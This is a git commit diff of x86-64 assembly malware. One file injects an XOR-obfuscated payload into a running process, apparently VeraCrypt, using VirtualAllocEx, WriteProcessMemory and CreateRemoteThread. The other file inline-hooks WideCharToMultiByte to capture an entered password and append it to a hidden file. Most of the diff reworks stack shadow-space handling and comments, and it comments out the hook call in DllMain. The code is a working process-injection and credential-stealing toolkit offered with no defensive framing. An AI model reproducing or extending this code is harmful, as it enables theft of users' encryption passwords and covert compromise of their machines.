d03d440325863ef1c08f44e957444df844f2923b
Nihal Kenkre <nihal.kenkre@gmail.com>
2024-01-03 13:07:10 +0530

    inline patching working through sRDI

--- asm/helper/helper.asm
+++ asm/helper/helper.asm
@@ -16,150 +16,129 @@ WinMain:
     ; [rbp - 56] = hThread
     ; 8 bytes padding
     sub rsp, 48                     ; allocate local variable space
+    sub rsp, 32                     ; allocate 32 byte shadow space
 
     mov qword [rbp - 8], 0          ; return value
 
-    sub rsp, 32
     call get_kernel_module_handle
-    add rsp, 32
 
     mov [rbp - 16], rax             ; kernel mod handle
 
-    sub rsp, 32
     mov rcx, [rbp - 16]             ; kernel mod handle
     call populate_kernel_function_ptrs_by_name
-    add rsp, 32
 
-    sub rsp, 32
     mov rcx, veracrypt_xor
     mov rdx, veracrypt_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    add rsp, 32
 
 .loop:
-    sub rsp, 32
     mov rcx, veracrypt_xor
     mov rdx, veracrypt_xor.len
     call find_target_process_id     ; proc id
-    add rsp, 32
 
     cmp rax, 0
     jne .loop_end
     
-    sub rsp, 32
-    mov rcx, 5000
+    mov rcx, 5000                   ; milliseconds to sleep
     call [sleep]
-    add rsp, 32
 
     jmp .loop
 
 .loop_end:
-int3
     mov [rbp - 24], rax             ; proc id
 
-    sub rsp, 32
     mov rcx, PROCESS_ALL_ACCESS
     mov rdx, 0
-    mov r8, [rbp - 24]
-    call [open_process]        ; proc handle
-    add rsp, 32
+    mov r8, [rbp - 24]              ; proc id
+    call [open_process]             ; proc handle
 
     cmp rax, 0
     je .shutdown
 
     mov [rbp - 32], rax             ; proc handle
 
-    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
-    mov rcx, [rbp - 32]
+    sub rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
+    mov rcx, [rbp - 32]             ; proc handle
     mov rdx, 0
     mov r8, sniff_data_xor.len
     mov r9, MEM_RESERVE
     xor r9, MEM_COMMIT
     mov qword [rsp + 32], PAGE_READWRITE
     call [virtual_alloc_ex]    ; mem addr
-    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
+    add rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
 
     cmp rax, 0                      ; if addr == 0 ?
     je .shutdown
 
     mov [rbp - 40], rax             ; payload mem
 
-    sub rsp, 32
     mov rcx, sniff_data_xor
     mov rdx, sniff_data_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    add rsp, 32
 
-    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
-    mov rcx, [rbp - 32]
-    mov rdx, [rbp - 40]
+    sub rsp, 16                     ; 1 arg + 8 byte stack align
+    mov rcx, [rbp - 32]             ; proc handle
+    mov rdx, [rbp - 40]             ; payload mem
     mov r8, sniff_data_xor
     mov r9, sniff_data_xor.len
     mov qword [rsp + 32], 0
     call [write_process_memory]
-    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
+    add rsp, 16                     ; 1 arg + 8 byte stack align
 
     cmp rax, 0                      ; write process memory failed ?
     je .shutdown
 
-    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
-    mov rcx,  [rbp - 32]
-    mov rdx, [rbp - 40]
+    sub rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
+    mov rcx,  [rbp - 32]            ; proc handle
+    mov rdx, [rbp - 40]             ; payload mem
     mov r8, sniff_data_xor.len
     mov r9, PAGE_EXECUTE_READ
     mov [rsp + 32], rbp
-    sub qword [rsp + 32], 48
+    sub qword [rsp + 32], 48        ; &dwOldProtect
     call [virtual_protect_ex]
-    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
+    add rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
 
     cmp rax, 0                      ; virtual protect ex failed ?
     je .shutdown
 
-    sub rsp, 64                     ; shadow space + 12 bytes vars + 8 byte padding
-    mov rcx, [rbp - 32]
+    sub rsp, 32                     ; 24 bytes vars + 8 byte padding
+    mov rcx, [rbp - 32]             ; proc handle
     xor rdx, rdx
     xor r8, r8
-    mov r9, [rbp - 40]
+    mov r9, [rbp - 40]              ; payload mem
     mov qword [rsp + 32], 0
     mov qword [rsp + 40], 0
     mov qword [rsp + 48], 0
-    call [create_remote_thread]    ; thread handle
-    add rsp, 64                     ; shadow space + 12 bytes vars + 8 byte padding
+    call [create_remote_thread]     ; thread handle
+    add rsp, 32                     ; 24 bytes vars + 8 byte padding
 
     cmp rax, 0                      ; hThread == NULL ?
     je .shutdown
         mov [rbp - 56], rax         ; hThread
 
-        sub rsp, 32
         mov rcx, rax
         mov rdx, -1
         call [wait_for_single_object]
-        add rsp, 32
 
-        sub rsp, 32
         mov rcx, [rbp - 56]         ; hThread
         call [close_handle]
-        add rsp, 32
 
 .shutdown:
 
-    sub rsp, 32
-    mov rcx, [rbp - 32]
-    mov rdx, [rbp - 40]
+    mov rcx, [rbp - 32]             ; proc handle
+    mov rdx, [rbp - 40]             ; payload mem
     xor r8, r8
     mov r9, MEM_RELEASE
     call [virtual_free_ex]
-    add rsp, 32
 
-    sub rsp, 32
-    mov rcx, [rbp - 32]
+    mov rcx, [rbp - 32]             ; proc handle
     call [close_handle]
-    add rsp, 32
 
+    add rsp, 32                     ; free 32 byte shadow space
     add rsp, 48                     ; free local variable space
 
     mov rax, [rbp - 8]              ; return value
--- asm/sniff/sniff.asm
+++ asm/sniff/sniff.asm
@@ -25,32 +25,34 @@ hooked_wide_char_to_multibyte_inline_patch:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx
-    mov [rbp + 24], rdx
-    mov [rbp + 32], r8
-    mov [rbp + 40], r9
+    mov [rbp + 16], rcx             ; code page
+    mov [rbp + 24], rdx             ; dwflags
+    mov [rbp + 32], r8              ; ccWideChar
+    mov [rbp + 40], r9              ; lpWideCharStr
 
     ; [rbp - 8] = return value
     ; [rbp - 16] = bytes written
     ; [rbp - 24] = text file handle
     ; 8 bytes padding
     sub rsp, 32                     ; allocate local variable space
+    sub rsp, 32                     ; allocate 32 byte shadow space
 
-    ; replace patch with original code
-    sub rsp, 48                     ; shadow space + 5th arg + 8 bytes padding
-    mov rcx, -1
+    ; replace patch with original bytes so the original function can be called and 
+    ; operation can continue as normal
+    sub rsp, 16                         ; 1 arg + 8 bytes padding
+    mov rcx, -1                         ; current process
     mov rdx, [wide_char_to_multibyte]
     mov r8, original_func_bytes
     mov r9, 14
     mov qword [rsp + 32], 0
     call [write_process_memory]
-    add rsp, 48                     ; shadow space + 5th arg + 8 bytes padding
+    add rsp, 16                         ; 1 arg + 8 bytes padding
 
-    cmp rax, 0                      ; WriteProcessMemory failed ?
+    cmp rax, 0                          ; WriteProcessMemory failed ?
     je .shutdown
 
     ; call the original function
-    sub rsp, 64
+    sub rsp, 32                     ; 4 args
     mov rcx, [rbp + 16]
     mov rdx, [rbp + 24]
     mov r8, [rbp + 32]
@@ -64,25 +66,25 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov rax, [rbp + 72]
     mov [rsp + 56], rax
     call [wide_char_to_multibyte]   ; bytes written
-    add rsp, 64
+    add rsp, 32                     ; 4 args
 
     mov [rbp - 16], rax             ; bytes written
 
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, passwd
-    mov rdx, [rbp + 48]
+    mov rdx, [rbp + 48]             ; lpMultiByteStr
     call strcpy
-    add rsp, 32
+    ; add rsp, 32
 
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, file_path_xor
     mov rdx, file_path_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    add rsp, 32
+    ; add rsp, 32
 
-    sub rsp, 64                     ; shadow space + 3 args + 8 byte padding
+    sub rsp, 32                     ; 3 args + 8 byte padding
     mov rcx, file_path_xor
     mov rdx, FILE_APPEND_DATA
     mov r8, FILE_SHARE_READ
@@ -91,34 +93,35 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
     mov qword [rsp + 48], 0
     call [create_file]              ; file handle
-    add rsp, 64                     ; shadow space + 2 args + 8 byte padding
+    add rsp, 32                     ; 3 args + 8 byte padding
 
     cmp rax, INVALID_HANDLE_VALUE   ; file handle invalid ?
     je .shutdown
 
     mov [rbp - 24], rax             ; file handle
 
-    sub rsp, 48                     ; shadow space + 1 args + 8 byte paddding
-    mov rcx, [rbp - 24]
+    sub rsp, 16                     ; 1 arg + 8 byte paddding
+    mov rcx, [rbp - 24]             ; text file handle
     mov rdx, passwd
-    mov r8, [rbp - 16]
+    mov r8, [rbp - 16]              ; bytes to write, len of passwd entered
     xor r9, r9
     mov qword [rsp + 32], 0
     call [write_file]
-    add rsp, 48
+    add rsp, 16                     ; 1 arg + 8 byte padding
 
     cmp rax, 0                      ; write file failed ?
     je .shutdown
 
-    sub rsp, 32
-    mov rcx, [rbp - 24]
+    ; sub rsp, 32
+    mov rcx, [rbp - 24]             ; text file handle
     call [close_handle]
-    add rsp, 32
+    ; add rsp, 32
 
     cmp rax, 0                      ; close handle failed ?
     je .shutdown
 
 .shutdown:
+    add rsp, 32                     ; free 32 byte shadow space
     add rsp, 32                     ; free local variable space
 
     leave
@@ -136,69 +139,68 @@ hook_inline_patch:
     mov rbp, rsp
     ; [rbp - 8] = return value
     ; [rbp - 16] = kernel handle
-    ; [rbp - 24] = current proc id
-    ; [rbp - 40] = patch
-    ; 8 bytes padding
-    sub rsp, 48                     ; allocate local variable space
+    ; [rbp - 32] = patch
+    sub rsp, 32                     ; allocate local variable space
+    sub rsp, 32                     ; allocate shadow space
 
     mov qword [rbp - 8], 0          ; return value
 
-    sub rsp, 32
+    ; sub rsp, 32
     call get_kernel_module_handle   ; kernel handle
-    add rsp, 32
+    ; add rsp, 32
 
     cmp rax, 0                      ; kernel handle == 0 ?
     je .shutdown
 
-    mov [rbp - 16], rax             ; kernel hanlde
+    mov [rbp - 16], rax             ; kernel handle
 
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, [rbp - 16]
     call populate_kernel_function_ptrs_by_name
-    add rsp, 32
+    ; add rsp, 32
 
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, wide_char_to_multibyte_xor
     mov rdx, wide_char_to_multibyte_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    add rsp, 32
+    ; add rsp, 32
 
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, [rbp - 16]
     mov rdx, wide_char_to_multibyte_xor
     call [get_proc_addr]            ; wide char to multi byte addr
-    add rsp, 32
+    ; add rsp, 32
 
     cmp rax, 0                      ; is addr == 0 ?
     je .shutdown
 
-    mov [wide_char_to_multibyte], rax   ; WidetCharToMultiByte addr
+    mov [wide_char_to_multibyte], rax   ; WideCharToMultiByte addr
 
-    sub rsp, 32
-    call [get_current_process] ; current proc id
-    add rsp, 32
+    ; sub rsp, 32
+    ; call [get_current_process] ; current proc id
+    ; add rsp, 32
 
-    mov [rbp - 24], rax             ; current proc id
+    ; mov [rbp - 24], rax             ; current proc id
 
     ; read 14 bytes from the original function
-    sub rsp, 48                     ; shadow space + 5th arg + 8 byte padding
-    mov rcx, [rbp - 24]
+    sub rsp, 16                     ; 1 arg + 8 byte padding
+    mov rcx, -1                     ; current proc id
     mov rdx, [wide_char_to_multibyte]
     mov r8, original_func_bytes
     mov r9, 14
     mov qword [rsp + 32], 0
     call [read_process_memory]      ; read result
-    add rsp, 48
+    add rsp, 16                     ; 1 arg + 8 byte padding
 
     cmp rax, 0                      ; ReadProcessMemory failed ?
     je .shutdown
 
     ; create patch
-    sub rsp, 32
+    ; sub rsp, 32
     mov rcx, rbp
-    sub rcx, 40
+    sub rcx, 32
     mov dword [rcx], 0x25ff
     add rcx, 4
     mov dword [rcx], 0
@@ -207,21 +209,22 @@ hook_inline_patch:
     mov [rcx], rax
 
     ; replace original code with patch
-    sub rsp, 48                     ; shadow space + 5th arg + 8 bytes padding
-    mov rcx, [rbp - 24]
+    sub rsp, 16                         ; 1 arg + 8 bytes padding
+    mov rcx, -1                         ; current proc id
     mov rdx, [wide_char_to_multibyte]
     mov r8, rbp
-    sub r8, 40
+    sub r8, 32
     mov r9, 14
     mov qword [rsp + 32], 0
     call [write_process_memory]
-    add rsp, 48                     ; shadow space + 5th arg + 8 bytes padding
+    add rsp, 16                         ; 1 arg + 8 bytes padding
 
-    cmp rax, 0                      ; WriteProcess failed ?
+    cmp rax, 0                          ; WriteProcess failed ?
     je .shutdown
 
 .shutdown:
-    add rsp, 48                     ; free local variable space
+    add rsp, 32                     ; free shadow space
+    add rsp, 32                     ; free local variable space
 
     leave
     ret
@@ -235,18 +238,18 @@ DllMain:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx
-    mov [rbp + 24], rdx
-    mov [rbp + 32], r8
+    mov [rbp + 16], rcx                     ; hInstance
+    mov [rbp + 24], rdx                     ; dwReason
+    mov [rbp + 32], r8                      ; reserved
 
-    cmp qword [rbp + 24], 1               ; PROCESS_ATTACH
+    cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
     jne .continue
 
-    call hook_inline_patch
+    ; call hook_inline_patch
     jmp .shutdown
 
 .continue:
-    cmp qword [rbp + 24], 0               ; PROCESS_DETACH
+    cmp qword [rbp + 24], 0                 ; PROCESS_DETACH
     jne .shutdown
 
 .shutdown:
